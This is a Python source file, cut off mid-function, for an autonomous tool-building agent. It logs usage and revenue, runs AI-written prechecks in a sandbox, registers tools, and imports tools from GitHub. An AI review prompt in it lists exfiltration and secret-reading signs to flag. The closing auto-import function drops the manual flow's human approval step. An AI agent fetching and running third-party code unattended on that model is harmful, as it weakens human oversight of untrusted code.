def save_usage_log(log):
    write_file(AI_USAGE_LOG_FILE, json.dumps(log[-MAX_USAGE_LOGGED:], indent=2))

def log_ai_usage(prompt_tokens, completion_tokens):
    with _usage_log_lock:
        log = load_usage_log()
        log.append({
            "timestamp": time.time(),
            "prompt_tokens": prompt_tokens,
            "completion_tokens": completion_tokens
        })
        save_usage_log(log)

def average_tokens_per_call():
    log = load_usage_log()
    if not log:
        return None
    avg_in = sum(e.get("prompt_tokens", 0) for e in log) / len(log)
    avg_out = sum(e.get("completion_tokens", 0) for e in log) / len(log)
    return avg_in, avg_out

def estimate_tokens_for(idea):
    """
    Numeric core of cost_estimate(), factored out so other code (like the
    dreamer budget gate) can check a number without parsing a string.
    Returns (estimated_calls, total_in_tokens, total_out_tokens, is_web).
    """
    is_web = is_web_idea(idea)
    is_build = any(w in idea.lower() for w in ["build", "create", "make a tool", "add a"])
    # A typical build touches write_code + a precheck/validate pass + a lesson reflection
    estimated_calls = 4 if is_build else 1

    avg = average_tokens_per_call()
    if avg:
        avg_in, avg_out = avg
    else:
        # crude fallback heuristic (~4 chars per token) until real usage data exists
        avg_in = max(len(idea) / 4, 50) + 600
        avg_out = 400

    total_in = avg_in * estimated_calls
    total_out = avg_out * estimated_calls
    return estimated_calls, total_in, total_out, is_web

def cost_estimate(idea):
    """
    Rough pre-flight estimate of what building/running this idea will
    cost in tokens (and $ if prices are set above), before the dreamer
    or build workflow actually spends anything. Calibrates itself over
    time using real usage logged from ask_ai() calls.
    """
    estimated_calls, total_in, total_out, is_web = estimate_tokens_for(idea)
    is_build = estimated_calls > 1
    cost_usd = (total_in / 1000000 * CEREBRAS_PRICE_PER_M_INPUT_TOKENS +
                total_out / 1000000 * CEREBRAS_PRICE_PER_M_OUTPUT_TOKENS)

    lines = [
        "Cost estimate for: " + idea,
        "Estimated AI calls: " + str(estimated_calls) + (" (build/validate/reflect)" if is_build else " (single Q&A)"),
        "Estimated tokens: ~" + str(int(total_in)) + " in / ~" + str(int(total_out)) + " out",
    ]
    if CEREBRAS_PRICE_PER_M_INPUT_TOKENS or CEREBRAS_PRICE_PER_M_OUTPUT_TOKENS:
        lines.append("Estimated cost: $" + format(cost_usd, ".4f"))
    else:
        lines.append("Estimated cost: set CEREBRAS_PRICE_PER_M_INPUT_TOKENS / OUTPUT_TOKENS to your plan's rate to see a $ figure here.")
    if is_web:
        lines.append("Note: idea looks web-based — may also trigger GitHub Actions minutes for Playwright/deploy steps, not counted above.")
    return "\n".join(lines)

# ============================================================
# REVENUE LEDGER
# ============================================================
# The bounty pipeline (scan_github_bounties/approve_bounty_lead) and the
# Stripe-linked web tools (resolve_stripe_placeholders) can both generate
# real income, but until now nothing on this side tracked whether any of
# it actually landed — there was no way to answer "is this worth the AI
# spend" except checking Stripe/email/bounty inboxes by hand. Stripe
# payments and bounty payouts can't be auto-detected without a webhook
# backend this agent doesn't have, so this is a manual ledger: you (or a
# future webhook-fed function) call log_revenue() when money actually
# arrives. Paired with the existing AI_USAGE_LOG_FILE (real logged token
# spend, not just cost_estimate()'s pre-flight guess) to give an actual
# net figure, not just a top-line revenue number.

REVENUE_LOG_FILE = workpath("revenue_log.json")
MAX_REVENUE_LOGGED = 1000
_revenue_lock = threading.Lock()

def load_revenue_log():
    return read_json_file(REVENUE_LOG_FILE, [])

def save_revenue_log(log):
    write_file(REVENUE_LOG_FILE, json.dumps(log[-MAX_REVENUE_LOGGED:], indent=2))

def log_revenue(source, amount, tool_id=None, note=""):
    """
    Records a real, already-received payment. source: short tag like
    "stripe", "bounty", "sponsorship", "other". tool_id: optional link
    back to the tools_index entry that earned it, so revenue can be
    attributed per-tool later. Returns the log entry, or a dict with an
    "error" key if amount isn't a valid positive number — never raises,
    same pattern as the other log_*() functions in this file.
    """
    try:
        amount = float(amount)
    except (TypeError, ValueError):
        return {"error": "amount must be a number, got: " + str(amount)}
    if amount <= 0:
        return {"error": "amount must be positive — use a note instead for refunds/chargebacks"}

    with _revenue_lock:
        log = load_revenue_log()
        entry = {
            "id": _next_log_id(log, "r"),
            "timestamp": time.time(),
            "source": (source or "other").strip().lower(),
            "amount": amount,
            "tool_id": tool_id,
            "note": note,
        }
        log.append(entry)
        save_revenue_log(log)
        return entry

def list_revenue(limit=10):
    log = load_revenue_log()
    if not log:
        return "No revenue logged yet."
    recent = log[-limit:]
    lines = []
    for e in reversed(recent):
        when = time.strftime("%Y-%m-%d", time.localtime(e["timestamp"]))
        tool_part = (" [" + e["tool_id"] + "]") if e.get("tool_id") else ""
        note_part = (" — " + e["note"]) if e.get("note") else ""
        lines.append(e["id"] + " " + when + " $" + format(e["amount"], ".2f") +
                     " (" + e["source"] + ")" + tool_part + note_part)
    return "\n".join(lines)

def total_ai_spend_usd():
    """
    Real (not estimated) AI spend to date, computed from AI_USAGE_LOG_FILE
    — the same log ask_ai() already writes to on every call via
    log_ai_usage(). Returns None if no price is configured, so callers can
    distinguish "$0 spent" from "price not set, can't compute."
    """
    if not (CEREBRAS_PRICE_PER_M_INPUT_TOKENS or CEREBRAS_PRICE_PER_M_OUTPUT_TOKENS):
        return None
    log = load_usage_log()
    total_in = sum(e.get("prompt_tokens", 0) for e in log)
    total_out = sum(e.get("completion_tokens", 0) for e in log)
    return (total_in / 1000000 * CEREBRAS_PRICE_PER_M_INPUT_TOKENS +
            total_out / 1000000 * CEREBRAS_PRICE_PER_M_OUTPUT_TOKENS)

def revenue_summary():
    """
    Top-line P&L: total revenue, broken down by source and by tool_id,
    net of real AI spend if a price is configured. This is the one number
    that answers "is any of this actually making money" — cost_estimate()
    only ever answered that per-idea, before the fact.
    """
    log = load_revenue_log()
    if not log:
        base = "No revenue logged yet. Use 'logrevenue: source | amount | tool_id | note' when a payment actually lands."
        spend = total_ai_spend_usd()
        if spend is not None:
            base += "\nAI spend to date: $" + format(spend, ".2f") + " — currently all cost, no revenue logged."
        return base

    total = sum(e["amount"] for e in log)
    by_source = {}
    by_tool = {}
    for e in log:
        by_source[e["source"]] = by_source.get(e["source"], 0) + e["amount"]
        if e.get("tool_id"):
            by_tool[e["tool_id"]] = by_tool.get(e["tool_id"], 0) + e["amount"]

    lines = ["=== Revenue Summary ===", "Total revenue: $" + format(total, ".2f")]

    spend = total_ai_spend_usd()
    if spend is not None:
        net = total - spend
        lines.append("AI spend to date: $" + format(spend, ".2f"))
        lines.append(("Net: $" if net >= 0 else "Net: -$") + format(abs(net), ".2f") +
                     (" (profitable)" if net > 0 else " (in the red)" if net < 0 else " (break-even)"))
    else:
        lines.append("AI spend: unknown — set CEREBRAS_PRICE_PER_M_INPUT_TOKENS/OUTPUT_TOKENS for a net figure.")

    lines.append("\nBy source:")
    for src, amt in sorted(by_source.items(), key=lambda kv: -kv[1]):
        lines.append("  " + src + ": $" + format(amt, ".2f"))

    if by_tool:
        lines.append("\nBy tool (top 5):")
        for tid, amt in sorted(by_tool.items(), key=lambda kv: -kv[1])[:5]:
            lines.append("  " + tid + ": $" + format(amt, ".2f"))

    lines.append("===========================================")
    return "\n".join(lines)

# ============================================================
# FAILURE CATEGORY TRACKING
# ============================================================

FAILURE_COUNTS_FILE = workpath("failure_counts.json")
PRECHECKS_FILE = workpath("prechecks_index.json")
PRECHECK_THRESHOLD = 3
# BUG FIX: same lost-update race as tools_index.json/agents_index.json/
# bounty_leads.json (see their lock notes elsewhere) — bump_failure_count()
# did an unlocked read-modify-write of FAILURE_COUNTS_FILE, and
# maybe_create_precheck() had an unlocked check-then-act on top of that
# (read count, check threshold, maybe create+save). This is called from
# build_and_fix_workflow / build_and_fix_on_github / build_and_fix_video_workflow,
# all of which can run concurrently via run_goal_with_dependencies()'s
# ThreadPoolExecutor. Two simultaneous failures in the same category could
# lose an increment (both read count=2, both write 3), and two threads
# could both pass the "count >= THRESHOLD and category not in prechecks"
# check at once and redundantly fire the (expensive) AI precheck-writing
# call before either save landed.
_precheck_lock = threading.Lock()

def categorize_failure(error_output):
    prompt = """Classify this error into ONE short category (2-3 words):

""" + error_output[:800] + """

Reply with ONLY the category, nothing else."""
    return ask_ai(prompt).strip().lower().replace(" ", "_")

def bump_failure_count(category):
    with _precheck_lock:
        counts = read_json_file(FAILURE_COUNTS_FILE, {})
        counts[category] = counts.get(category, 0) + 1
        write_file(FAILURE_COUNTS_FILE, json.dumps(counts, indent=2))
        return counts[category]

def load_prechecks():
    return read_json_file(PRECHECKS_FILE, {})

def save_prechecks(data):
    write_file(PRECHECKS_FILE, json.dumps(data, indent=2))

def propose_precheck(category, lesson=""):
    lesson_block = ("\nThe specific reusable lesson learned from this failure: " + lesson) if lesson else ""
    prompt = """This failure category has happened """ + str(PRECHECK_THRESHOLD) + """+ times: """ + category + lesson_block + """

Write a Python function called precheck_""" + category + """(code_text) that inspects
generated code (as a string — use static text/pattern checks only, do NOT execute the
code) and returns (True, "") if it looks safe, or (False, "reason") if it looks likely
to repeat this specific lesson. Be conservative: only return False when the code text
is clearly missing the thing the lesson calls for.
Reply with ONLY the function code."""
    return strip_fences(ask_ai(prompt))

def maybe_create_precheck(category, lesson=""):
    # BUG FIX: the count bump, the threshold check, and the prechecks-file
    # write must all happen as one atomic unit — see _precheck_lock's
    # definition above. propose_precheck() (the slow AI call) stays outside
    # the lock since it doesn't touch either file and shouldn't block other
    # threads' unrelated failure-count bumps while it runs; the "category
    # not in prechecks" re-check right before the save catches the case
    # where another thread finished creating this same precheck while we
    # were waiting on the AI call.
    with _precheck_lock:
        counts = read_json_file(FAILURE_COUNTS_FILE, {})
        counts[category] = counts.get(category, 0) + 1
        count = counts[category]
        write_file(FAILURE_COUNTS_FILE, json.dumps(counts, indent=2))
        prechecks = load_prechecks()
        should_create = count >= PRECHECK_THRESHOLD and category not in prechecks
    if not should_create:
        return
    code = propose_precheck(category, lesson)
    with _precheck_lock:
        prechecks = load_prechecks()
        if category in prechecks:
            return  # someone else created it while we were waiting on the AI call
        prechecks[category] = code
        save_prechecks(prechecks)
        print("New defensive check created for: " + category)

PRECHECK_TMP_DIR = workpath("_precheck_tmp")

def _run_single_precheck(category, func_code, code_text):
    """
    Runs one AI-generated precheck function in a sandboxed subprocess
    (separate process, resource-limited via run_sandboxed_python, no
    inherited secrets) instead of exec()'ing untrusted AI-written code
    in-process. Fails open if the precheck itself errors or the runner
    breaks, so one buggy generated check can never lock the pipeline up
    — it only blocks when it actually runs and says no.
    """
    os.makedirs(PRECHECK_TMP_DIR, exist_ok=True)
    safe_category = re.sub(r"[^a-z0-9_]", "_", category.lower())[:60] or "unknown"
    runner_path = os.path.join(PRECHECK_TMP_DIR, "runner_" + safe_category + ".py")
    payload_path = os.path.join(PRECHECK_TMP_DIR, "code_text.txt")
    write_file(payload_path, code_text)
    driver = func_code + """

import json
with open("code_text.txt", "r") as f:
    _code_text = f.read()
try:
    _ok, _reason = """ + "precheck_" + category + """(_code_text)
    print(json.dumps({"ok": bool(_ok), "reason": str(_reason)}))
except Exception as e:
    print(json.dumps({"ok": True, "reason": "precheck errored: " + str(e)}))
"""
    write_file(runner_path, driver)
    success, output = run_sandboxed_python(runner_path, timeout=10)
    try:
        last_line = [l for l in output.strip().splitlines() if l.strip()][-1]
        result = json.loads(last_line)
        return bool(result.get("ok", True)), str(result.get("reason", ""))
    except Exception:
        return True, ""  # infra failure — fail open, don't block on our own bug

def run_all_prechecks(code_text):
    """
    Runs every learned precheck against new code, sandboxed. Returns
    (blocked, warnings): blocked=True means at least one lesson the
    system already learned the hard way says this code is likely to
    repeat a past failure — callers should refuse to run it, not just
    print a warning.
    """
    prechecks = load_prechecks()
    warnings = []
    blocked = False
    for category, func_code in prechecks.items():
        ok, reason = _run_single_precheck(category, func_code, code_text)
        if not ok:
            blocked = True
            warnings.append(category + ": " + reason)
    return blocked, warnings

# ============================================================
# TOOL REGISTRY
# ============================================================

TOOLS_DIR = workpath("generated_tools")
TOOLS_RETIRED_DIR = os.path.join(TOOLS_DIR, "retired")
TOOLS_INDEX_FILE = workpath("tools_index.json")
os.makedirs(TOOLS_DIR, exist_ok=True)
os.makedirs(TOOLS_RETIRED_DIR, exist_ok=True)
# BUG FIX: every read-modify-write site below (register_tool,
# register_github_tool, register_web_tool, the two github-import register
# blocks, update_tool_trust, retire_tool) used to do a bare
# load_tools_index() -> mutate -> save_tools_index() with NO locking at
# all — unlike pending_ideas.json, which already has _pending_ideas_lock.
# Confirmed by reproduction: 5 threads calling register_tool()
# concurrently (a realistic scenario, since the main thread and the
# dreamer thread both register tools) resulted in 4 of the 5 new tools
# being silently lost AND all 5 colliding on the same generated id —
# the save from each thread overwrote whatever the others had just
# written, because each one's "next id" was computed from its own stale
# in-memory snapshot. Wrapping each critical section in this lock makes
# every index update atomic the same way add_pending_idea() already is.
_tools_index_lock = threading.Lock()

def load_tools_index():
    return read_json_file(TOOLS_INDEX_FILE, [])

def save_tools_index(index):
    write_file(TOOLS_INDEX_FILE, json.dumps(index, indent=2))

_time_sensitive_cache = {}
_web_idea_cache = {}
_wants_3d_cache = {}
_wants_game_cache = {}
_wants_teardown_cache = {}
_wants_multipage_cache = {}
_wants_backend_cache = {}
_wants_auth_cache = {}
_wants_file_upload_cache = {}
_wants_payment_cache = {}

def is_time_sensitive(idea):
    if idea in _time_sensitive_cache:
        return _time_sensitive_cache[idea]
    prompt = """Does this task depend on live data that changes daily? Reply with ONLY: YES or NO
Task: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _time_sensitive_cache[idea] = result
    return result

def is_web_idea(idea):
    if idea in _web_idea_cache:
        return _web_idea_cache[idea]
    prompt = """Is this best built as a website/browser thing rather than a Python script?
Reply WEB for anything visual/interactive meant to be looked at or played with in a browser — including games, dashboards, and interactive 3D viewers/explorers (e.g. "disassemble a car", "explode view of an engine", "show me the layers of the earth", "take apart a human body", "what's inside a beehive" — these are all WEB, not scripts, even though they don't sound like a typical "website"). Reply SCRIPT only for things that just process data or files with no visual/interactive output of their own.
Reply with ONLY: WEB or SCRIPT
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "WEB"
    _web_idea_cache[idea] = result
    return result

_video_idea_cache = {}

def is_video_idea(idea):
    """
    Classifies whether a request is about producing/editing an actual
    VIDEO FILE (trim, cut, concatenate, add captions/overlays, convert,
    render a clip from images, etc.) as opposed to a website/game (handled
    by is_web_idea) or a plain data script. Checked after is_web_idea in
    build_and_fix_workflow so a request like "make a game map full of
    stars with real graphics" is correctly routed to the web lane.
    """
    if idea in _video_idea_cache:
        return _video_idea_cache[idea]
    prompt = """Does this task require producing or editing an actual VIDEO FILE (e.g. trimming, cutting, concatenating clips, adding captions/overlays/music, converting formats, or rendering a short clip)? Reply NO if it is a website, app, game, or a task that doesn't involve a video file.
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _video_idea_cache[idea] = result
    return result

_unity_idea_cache = {}

def is_unity_idea(idea):
    """
    Classifies whether a request wants an actual Unity game project (C#
    MonoBehaviour scripts + project scaffold) as opposed to a browser
    game (is_web_idea) or a video file (is_video_idea). Checked after
    both of those in build_and_fix_workflow. No Unity Editor/license is
    available to this agent, so this lane is SCRIPT-ONLY: it produces
    real, structurally-checked C# scripts and a project scaffold, but
    cannot compile/build them the way the video lane renders real .mp4
    output on a GitHub Actions runner. See UNITY BUILD LANE below.
    """
    if idea in _unity_idea_cache:
        return _unity_idea_cache[idea]
    prompt = """Does this task explicitly ask for a UNITY game project (mentions Unity, C# game scripts, MonoBehaviour, or "game" in a context clearly meaning a Unity/engine-based game rather than a browser game)? Reply NO for browser/HTML/JS games, videos, websites, or plain scripts.
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _unity_idea_cache[idea] = result
    return result

def _next_tool_id(index):
    """
    Returns the next 'tool_N' id that has never been used, active or
    retired. NOTE: len(index) + 1 is NOT safe here — retire_tool() removes
    entries from the active index, so after any retirement the list shrinks
    and a length-based id can collide with a still-active tool (it did,
    confirmed by reproduction: silently overwrote an existing tool's source
    file on disk).
    """
    max_n = 0
    for t in index:
        m = re.match(r"^tool_(\d+)$", t.get("id", ""))
        if m:
            max_n = max(max_n, int(m.group(1)))
    if os.path.isdir(TOOLS_RETIRED_DIR):
        for fname in os.listdir(TOOLS_RETIRED_DIR):
            m = re.match(r"^tool_(\d+)(?:\.py|_reason\.txt)$", fname)
            if m:
                max_n = max(max_n, int(m.group(1)))
    return "tool_" + str(max_n + 1)

def register_tool(idea, code, contract="plain", source_context=None):
    """
    source_context: optional raw material the idea was actually drawn from
    (e.g. the live web search results that inspired a dreamer-sourced tool).
    Stored verbatim (truncated) so a later self-test can ask a REAL question
    grounded in what the tool was built for, instead of only re-deriving a
    question from the one-line idea summary. None for ideas that don't have
    a concrete source (e.g. reasoning-only propose_new_idea()).
    """
    time_sensitive = is_time_sensitive(idea)  # network call — keep outside the lock
    with _tools_index_lock:
        index = load_tools_index()
        tool_id = _next_tool_id(index)
        filepath = os.path.join(TOOLS_DIR, tool_id + ".py")
        write_file(filepath, code)
        entry = {
            "id": tool_id, "idea": idea, "filepath": filepath, "type": "local",
            "contract": contract, "good_runs": 0, "bad_runs": 0,
            "time_sensitive": time_sensitive
        }
        if source_context:
            entry["source_context"] = source_context[:2000]
        index.append(entry)
        save_tools_index(index)
    _tool_match_cache.clear()  # New tool added — invalidate lookup cache
    upload_msg = upload_tool_to_repo(tool_id, idea, code, source="self-built")
    print(upload_msg)
    return tool_id

def register_github_tool(idea, repo_name):
    time_sensitive = is_time_sensitive(idea)  # network call — keep outside the lock
    with _tools_index_lock:
        index = load_tools_index()
        tool_id = _next_tool_id(index)
        index.append({
            "id": tool_id, "idea": idea, "repo_name": repo_name, "type": "github",
            "good_runs": 0, "bad_runs": 0, "time_sensitive": time_sensitive
        })
        save_tools_index(index)
    return tool_id

def register_web_tool(idea, url, folder, kvdb_bucket=None):
    with _tools_index_lock:
        index = load_tools_index()
        tool_id = _next_tool_id(index)
        entry = {
            "id": tool_id, "idea": idea, "type": "web", "url": url, "folder": folder,
            "good_runs": 0, "bad_runs": 0, "time_sensitive": False
        }
        if kvdb_bucket:
            entry["kvdb_bucket"] = kvdb_bucket
        index.append(entry)
        save_tools_index(index)
    return tool_id

# ============================================================
# GITHUB TOOL CATALOG — upload + safe import
# Every agent (main or spawned) shares this code since spawned agents
# are full copies of this file, so the upload logic and import pipeline
# work identically everywhere with zero per-agent wiring.
# ============================================================

MY_TOOLS_REPO = "my-tools"

def ensure_my_tools_repo():
    """Creates the shared tool catalog repo on GitHub if it doesn't exist yet."""
    username = get_github_username()
    if not username:
        return False
    headers = github_headers()
    if headers is None:
        return False
    # BUG FIX: this GET had no try/except at all — a network blip, DNS
    # failure, or timeout here would raise straight out of this function.
    # Its caller (upload_tool_to_repo) does wrap everything in a broad
    # except, so it wasn't silently crashing the whole process, but any
    # other future caller of ensure_my_tools_repo() directly would have
    # been unprotected. Made this function self-contained instead of
    # relying on callers to save it.
    try:
        check = requests.get(
            "https://api.github.com/repos/" + username + "/" + MY_TOOLS_REPO,
            headers=headers, timeout=30
        )
    except requests.exceptions.RequestException:
        return False
    if check.status_code == 200:
        return True
    result = create_github_repo(
        MY_TOOLS_REPO,
        description="Auto-uploaded tool catalog from my AI agent",
        private=False
    )
    return result.startswith("Created repo")

def load_my_tools_manifest():
    username = get_github_username()
    if not username:
        return []
    try:
        resp = requests.get(
            "https://raw.githubusercontent.com/" + username + "/" + MY_TOOLS_REPO + "/main/manifest.json",
            timeout=30
        )
        if resp.status_code == 200:
            try:
                data = resp.json()
                return data if isinstance(data, list) else []
            except ValueError:
                # manifest.json exists but isn't valid JSON (partial push,
                # manual edit gone wrong, etc.) — treat as empty rather
                # than raising and taking down whichever caller wanted it.
                return []
    except requests.exceptions.RequestException:
        pass
    return []

def save_my_tools_manifest(manifest):
    content = json.dumps(manifest, indent=2)
    return create_github_file(
        MY_TOOLS_REPO, "manifest.json", content,
        commit_message="Update manifest"
    )

def upload_tool_to_repo(tool_id, idea, code, source="self-built", origin_url=""):
    """
    Pushes a validated tool's code to the shared my-tools repo and records
    it in manifest.json, tagged with AGENT_NAME so you can see which agent
    (main or spawned) built it. Safe to call from any agent. Never raises —
    returns a short status string instead.
    """
    try:
        if not ensure_my_tools_repo():
            return "Upload skipped: could not access/create " + MY_TOOLS_REPO

        file_path = "tools/" + tool_id + ".py"
        agent_tag = globals().get("AGENT_NAME", "main")

        create_github_file(
            MY_TOOLS_REPO, file_path, code,
            commit_message="Add " + tool_id + " (" + agent_tag + ")"
        )

        manifest = load_my_tools_manifest()
        manifest = [m for m in manifest if m.get("id") != tool_id]  # replace if re-uploaded
        manifest.append({
            "id": tool_id,
            "idea": idea,
            "agent": agent_tag,
            "source": source,            # "self-built" or "github-import"
            "origin_url": origin_url,    # set for imports, blank for self-built
            "path": file_path,
            "uploaded_at": time.time()
        })
        save_my_tools_manifest(manifest)
        return "Uploaded " + tool_id + " to " + MY_TOOLS_REPO + "/" + file_path
    except Exception as e:
        return "Upload failed for " + tool_id + ": " + str(e)


IMPORTED_TOOLS_DIR = workpath("imported_tools")
os.makedirs(IMPORTED_TOOLS_DIR, exist_ok=True)

def find_github_tool(task):
    """
    Searches public GitHub repos for something matching the task via the
    public search API. Returns a list of candidate dicts.
    """
    try:
        resp = requests.get(
            "https://api.github.com/search/repositories",
            headers=github_headers(),
            params={"q": task + " in:name,description,readme", "sort": "stars", "per_page": 5},
            timeout=30
        )
        try:
            data = resp.json()
        except ValueError:
            print("GitHub search returned a non-JSON response (status " + str(resp.status_code) + ").")
            return []
        items = data.get("items", [])
        if not items:
            return []
        candidates = []
        for repo in items:
            candidates.append({
                "name": repo.get("name", ""),
                "repo": repo.get("full_name", ""),
                "url": repo.get("html_url", ""),
                "description": repo.get("description", "") or "",
                "stars": repo.get("stargazers_count", 0),
                "default_branch": repo.get("default_branch", "main")
            })
        return candidates
    except requests.exceptions.RequestException as e:
        print("GitHub search failed: " + str(e))
        return []

def _fetch_repo_main_file(repo_full_name, default_branch="main"):
    """
    Best-effort fetch of README + a likely main script from a repo, without
    cloning. Returns (readme_text, main_code, main_filename).
    """
    readme_text = ""
    try:
        r = requests.get(
            "https://raw.githubusercontent.com/" + repo_full_name + "/" + default_branch + "/README.md",
            timeout=20
        )
        if r.status_code == 200:
            readme_text = r.text[:2000]
    except requests.exceptions.RequestException:
        pass

    candidate_names = ["main.py", "app.py", "script.py", "run.py", "index.js", "main.js"]
    for name in candidate_names:
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/" + repo_full_name + "/" + default_branch + "/" + name,
                timeout=20
            )
            if r.status_code == 200 and r.text.strip():
                return readme_text, r.text[:6000], name
        except requests.exceptions.RequestException:
            continue
    return readme_text, "", ""

def inspect_github_tool(repo_full_name, default_branch="main"):
    """
    Fetches a candidate tool and runs it through check_security() PLUS an
    AI review looking for risks the static scanner can't catch (network
    exfil, obfuscation, broad env-var reads, etc). Returns a report dict.
    """
    readme, code, filename = _fetch_repo_main_file(repo_full_name, default_branch)
    if not code:
        return {"ok": False, "reason": "Could not find a readable entry-point file in this repo."}

    sec_passed, sec_reason = check_security(code)

    review_prompt = (
        "Review this code that was found on public GitHub, NOT written by us.\n\n"
        "README excerpt:\n" + readme[:800] + "\n\n"
        "CODE:\n" + code[:4000] + "\n\n"
        "Answer in this exact format:\n"
        "SUMMARY: <one sentence on what it does>\n"
        "NEEDS: <packages or env vars it requires, or NONE>\n"
        "FLAGGED: <YES if it does anything risky beyond what's obvious - "
        "network calls to unknown hosts, reading env vars broadly, obfuscated "
        "code, file deletion, sending data externally - otherwise NO>\n"
        "FLAG_REASON: <why, or NONE>"
    )
    review = ask_ai(review_prompt)
    summary_match = re.search(r"SUMMARY:\s*(.+)", review)
    needs_match = re.search(r"NEEDS:\s*(.+)", review)
    flagged_match = re.search(r"FLAGGED:\s*(YES|NO)", review, re.IGNORECASE)
    flag_reason_match = re.search(r"FLAG_REASON:\s*(.+)", review)

    ai_flagged = bool(flagged_match and flagged_match.group(1).upper() == "YES")

    return {
        "ok": sec_passed and not ai_flagged,
        "code": code,
        "filename": filename,
        "readme": readme,
        "security_reason": sec_reason,
        "ai_summary": summary_match.group(1).strip() if summary_match else "(no summary)",
        "ai_needs": needs_match.group(1).strip() if needs_match else "NONE",
        "ai_flagged": ai_flagged,
        "ai_flag_reason": flag_reason_match.group(1).strip() if flag_reason_match else ""
    }

def stage_github_tool(repo_full_name, task_idea, inspection):
    """
    Saves an approved candidate's code into an isolated import folder.
    Not registered as usable yet — that happens after a successful
    isolated test run. Returns (tool_id, dest_file_path).
    """
    tool_id = "ghimport_" + str(int(time.time()))
    dest_dir = os.path.join(IMPORTED_TOOLS_DIR, tool_id)
    os.makedirs(dest_dir, exist_ok=True)
    dest_file = os.path.join(dest_dir, "tool.py")
    write_file(dest_file, inspection["code"])
    write_file(
        os.path.join(dest_dir, "INFO.txt"),
        "Source repo: " + repo_full_name + "\n"
        "Idea: " + task_idea + "\n"
        "Summary: " + inspection["ai_summary"] + "\n"
        "Needs: " + inspection["ai_needs"] + "\n"
    )
    return tool_id, dest_file

def run_staged_tool(tool_id, dest_file, args_text=""):
    """
    Runs an imported tool as an isolated subprocess: stripped environment
    (no GITHUB_TOKEN, no Cerebras keys, no Gmail/Telegram creds), its own
    cwd (can't see main.py, tools_index.json, memory files), hard timeout.
    Returns (success: bool, output: str).
    """
    safe_env = {
        "PATH": os.environ.get("PATH", ""),
        "PYTHONIOENCODING": "utf-8",
    }
    try:
        result = subprocess.run(
            ["python3", dest_file] + (args_text.split() if args_text else []),
            cwd=os.path.dirname(dest_file),
            env=safe_env,
            capture_output=True, text=True, timeout=30,
            preexec_fn=_sandbox_limits if os.name != "nt" else None
        )
        output = (result.stdout or "") + (("\n[stderr]\n" + result.stderr) if result.stderr else "")
        return result.returncode == 0, output[:1500]
    except subprocess.TimeoutExpired:
        return False, "Timed out after 30s (isolated run)."
    except Exception as e:
        return False, "Isolated run failed: " + str(e)

def import_github_tool_workflow(task_idea):
    """
    Full pipeline for 'importtool: <task>': search -> show candidates ->
    inspect top match -> show report -> ask for explicit approval ->
    isolated test run -> register + upload.
    """
    print("Searching GitHub for: " + task_idea)
    candidates = find_github_tool(task_idea)
    if not candidates:
        return "No GitHub repos found matching that."

    print("\nTop candidates:")
    for i, c in enumerate(candidates):
        print(str(i + 1) + ". " + c["repo"] + " (\u2605" + str(c["stars"]) + ") - " + c["description"][:80])

    choice = input("Pick a number to inspect (or 'cancel'): ").strip()
    if choice.lower() == "cancel" or not choice.isdigit():
        return "Cancelled."
    idx = int(choice) - 1
    if idx < 0 or idx >= len(candidates):
        return "Invalid choice."

    picked = candidates[idx]
    print("\nInspecting " + picked["repo"] + " ...")
    inspection = inspect_github_tool(picked["repo"], picked["default_branch"])
    if "code" not in inspection or not inspection.get("code"):
        return inspection.get("reason", "Could not inspect this repo.")

    print("\n--- Inspection Report ---")
    print("What it does: " + inspection["ai_summary"])
    print("Needs:        " + inspection["ai_needs"])
    print("Static scan:  " + ("PASSED" if inspection["security_reason"] == "" else "FAILED - " + inspection["security_reason"]))
    print("AI flagged:   " + ("YES - " + inspection["ai_flag_reason"] if inspection["ai_flagged"] else "NO"))
    print("-------------------------")

    if not inspection["ok"]:
        log_rejected_tool(task_idea, "GitHub import blocked: " + (inspection["security_reason"] or inspection["ai_flag_reason"]))
        return "Blocked \u2014 this tool failed validation and was not imported."

    approve = input("Looks safe. Stage and test-run it in isolation? (yes/no): ").strip().lower()
    if approve != "yes":
        return "Cancelled by user."

    tool_id, dest_file = stage_github_tool(picked["repo"], task_idea, inspection)
    print("Staged at " + dest_file + ". Running in isolated sandbox (no API keys, no file access outside this folder)...")

    success, output = run_staged_tool(tool_id, dest_file)
    print("\n--- Isolated run output ---")
    print(output)
    print("----------------------------")

    if not success:
        return "Isolated test run failed \u2014 tool was not registered. You can inspect it at " + dest_file

    final_approve = input("Test run succeeded. Register this tool for real use? (yes/no): ").strip().lower()
    if final_approve != "yes":
        return "Not registered \u2014 staged copy kept at " + dest_file

    time_sensitive = is_time_sensitive(task_idea)  # network call — keep outside the lock
    with _tools_index_lock:
        index = load_tools_index()
        index.append({
            "id": tool_id, "idea": task_idea, "filepath": dest_file, "type": "local",
            "contract": "plain", "good_runs": 1, "bad_runs": 0,
            "time_sensitive": time_sensitive,
            "source": "github-import", "origin_repo": picked["repo"]
        })
        save_tools_index(index)
    _tool_match_cache.clear()

    upload_msg = upload_tool_to_repo(
        tool_id, task_idea, inspection["code"],
        source="github-import", origin_url=picked["url"]
    )
    print(upload_msg)

    return "Registered " + tool_id + " from " + picked["repo"] + ". " + upload_msg


def import_github_tool_auto(task_idea):
    """
    Fully automatic version of import_github_tool_workflow() — no input()
    prompts, safe to call from a background thread (the dreamer). Keeps
    every safety gate from the manual flow, it just doesn't pause for a
    human to click yes:
      1. GitHub code search (find_github_tool)
      2. static AST security scan (check_security, inside inspect_github_tool)
      3. AI review for non-obvious risk - network exfil, obfuscation,
         broad env-var reads, etc (also inside inspect_github_tool)
      4. isolated sandboxed test run (run_staged_tool: no API keys, no
         file access outside its own folder, hard 30s timeout)
    Registration only happens if ALL of those pass. Returns a result
    string on success, or None if nothing usable was found or it failed
    any safety check (failures are silently logged via log_rejected_tool,
    same as the rest of the dreamer pipeline).
    """
    candidates = find_github_tool(task_idea)
    if not candidates:
        return None

    # Highest-starred candidate — same trust signal a human picking from
    # the list would use, just automated instead of asking for a number.
    picked = max(candidates, key=lambda c: c.get("stars", 0))

    inspection = inspect_github_tool(picked["repo"], picked["default_branch"])
    if "code" not in inspection or not inspection.get("code"):
        return None

    if not inspection["ok"]:
        log_rejected_tool(task_idea, "GitHub auto-import blocked: " +
